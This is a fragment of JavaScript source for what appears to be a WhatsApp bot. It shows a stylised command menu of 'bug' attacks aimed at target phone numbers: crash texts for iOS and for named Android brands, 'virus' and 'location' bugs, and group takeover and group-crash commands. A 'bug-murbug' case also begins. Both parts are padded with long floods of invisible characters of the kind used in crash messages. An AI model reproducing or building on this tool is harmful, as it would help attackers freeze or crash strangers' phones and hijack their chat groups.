͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
┏───────────────────┓
│ 𝐎𝐰𝐧𝐞𝐫 : *${global.NamaOwner}*
│ 𝐁𝐨𝐭𝐧𝐚𝐦𝐞 : *${global.namabot}*
│ 𝐔𝐬𝐞𝐫 : ${isPremium ? '𝗩𝗶𝗽' : '𝗙𝗿𝗲𝗲' }
│ 𝐌𝐨𝐝𝐞 : 𝗣𝗿𝗶𝘃𝗮𝘁𝗲
│ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟳.𝟬
│ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝗢𝗻𝗹𝗶𝗻𝗲
│ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
╰┓ 𝐋𝐢𝐛𝐫𝐚𝐲 : 𝗕𝗮𝗶𝗹𝘆𝘀 - 𝗦𝗼𝗰𝗸𝗲𝘁
   ┗──────────────────┛
┏──╴[ 𝘽𝙐𝙂 𝙑𝙄𝙍𝙏𝙀𝙓 ] ───┓
│${global.simbol} ${prefix}ᴠɪʀᴛᴇx 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴛᴇx1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴛᴇx2 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴛᴇx3 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʙʏᴏɴᴇ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴘ-ᴍᴀʙᴀʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴀᴡᴏᴋᴀᴡᴏᴋ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴀɴᴊᴀʏᴍᴀʙᴀʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}1ᴠ1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴅᴀʀᴋsɪsᴛᴇᴍ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏──╴[ 𝙆𝙃𝙐𝙎𝙐𝙎 𝙂𝘾 ] ───┓
│${global.simbol} ${prefix}ᴋᴜᴅᴇᴛᴀᴛʜᴘ 
│${global.simbol} ${prefix}ɢᴄᴀᴍᴘᴀs 𝗜𝗗𝗚𝗖
│${global.simbol} ${prefix}ɢᴄᴊᴇʙᴇʜ 𝗜𝗗𝗚𝗖
│${global.simbol} ${prefix}ɢᴀsʙᴜɢɢᴄ 𝗜𝗗𝗚𝗖
│${global.simbol} ${prefix}ɪᴅɢᴄ 𝗟𝗜𝗡𝗞𝗚𝗖
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙑𝙄𝙋 ]╶────┓
│${global.simbol} ${prefix}ʙᴇᴛᴀ-ᴜᴘ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɢʙᴡᴀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴡᴀᴏʀɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʙᴜsɪɴᴇss 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙄𝙊𝙎 ]╶────┓
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏɪᴘʜᴏɴᴇ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏɪᴏs 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɪᴏsᴀᴛᴛᴀᴄᴋ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴋɪʟʟɪᴏs 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏──╴[ 𝘽𝙐𝙂 𝘼𝙉𝘿𝙍𝙊 ]╶──┓
│${global.simbol} ${prefix}sᴀᴍsᴜɴɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴏᴘᴘᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪᴠᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɪɴғɪɴɪx 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}xɪᴏᴍɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʀᴇᴀʟᴍɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴇɴᴏᴠᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴍᴇɪᴢᴜ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɴᴏᴋɪᴀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}sᴏɴʏ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴀʟʟᴅᴇᴠɪᴄ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙋𝙍𝙄𝘽 ]╶───┓
│${global.simbol} ${prefix}ᴛᴇs 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}ʜᴀʟᴏ 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}ᴡᴏɪ 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}ʜᴇᴍ 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}=. 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}👽 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}💀 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}💔 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}🙊 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}😷 𝗧𝗶𝗺𝗲
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙇𝙊𝘾 ] ────┓
│${global.simbol} ${prefix}ʟᴏᴋᴀsɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴏᴋᴀsɪ1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴏᴋᴀsɪ2 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴏᴋᴀsɪ3 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙑𝙄𝙍𝙐𝙎 ]╶──┓
│${global.simbol} ${prefix}ᴠɪʀᴜsʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴜsᴊɪᴅ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴀᴜᴅ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴇᴍʙᴜ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴘʜɪʟɪᴘs 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɢᴀsʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴘᴀɴᴀsᴏɴɪᴄ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
  ┏───────────────┓
  │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  │ 𝙋𝙤𝙬𝙚𝙧𝙙 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  ┗───────────────┛`)
}
break
//=================================================//
case 'bug-murbug': {
await loading()
zreply(`┏─╴[ 𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧 ] ──┓
│ 𝗛𝘆 *${m.pushName}*
│ *${time}*
│ *${ucapanWaktu}*
┗─────────────────┛͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏